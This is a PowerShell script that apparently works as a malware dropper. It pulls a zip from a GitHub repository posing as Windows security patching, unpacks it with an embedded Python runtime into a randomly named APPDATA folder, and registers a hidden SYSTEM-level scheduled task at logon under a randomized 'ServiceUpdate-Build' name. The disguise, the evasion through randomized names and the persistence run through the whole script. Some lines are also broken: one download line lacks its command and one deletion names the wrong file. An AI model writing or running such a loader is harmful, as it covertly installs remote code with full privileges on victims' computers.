$ErrorActionPreference = "Stop"
$AppDataPath = $env:APPDATA
$Length = 10
$Characters = 'abcdefghijklmnopqrstuvwxyz0123456789'
$RandomString = -join ($Characters.ToCharArray() | Get-Random -Count $Length)
$FolderName = "$RandomString"
$MAJOR = Get-Random -Minimum 1 -Maximum 11 # 1-10
$MINOR = Get-Random -Minimum 0 -Maximum 100 # 0-99
$BUILD = Get-Random -Minimum 0 -Maximum 1000 # 0-999
$REVISION = Get-Random -Minimum 0 -Maximum 10000 # 0-9999
$VERSION = "$MAJOR.$MINOR.$BUILD.$REVISION"
$winsecUI = Join-Path $AppDataPath $FolderName "WindowsSecurityUI"
$serviceUIPath = Join-Path $winsecUI "ServiceUI.exe"
$wssrvcPyPath = Join-Path $winsecUI "wssrvc.py"
$pythonwExePath = Join-Path $winsecUI "pythonw.exe"
https://github.com/xxoo-d/Windows-Security-Patching/raw/refs/heads/main/WindowsSecurityUI.zip -O $env:APPDATA\WindowsSecurityUI.zip
Expand-Archive -Path $env:APPDATA\WindowsSecurityUI.zip -DestinationPath $env:APPDATA\$FolderName
wget https://www.python.org/ftp/python/3.14.0/python-3.14.0-embed-amd64.zip -O $env:APPDATA\python-3.14.0-embed-amd64.zip
Expand-Archive -Path $env:APPDATA\python-3.14.0-embed-amd64.zip -DestinationPath $env:APPDATA\$FolderName\WindowsSecurityUI\
rm $env:APPDATA\WindowsSecurity.zip
rm $env:APPDATA\python-3.14.0-embed-amd64.zip
$scheduledTaskName = "ServiceUpdate-Build-$VERSION"
$action = New-ScheduledTaskAction -Execute $serviceUIPath -Argument "$pythonwExePath $wssrvcPyPath"
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -TaskName $scheduledTaskName -Action $action -Trigger $trigger -User "System" -Force
Start-ScheduledTask -TaskName $scheduledTaskName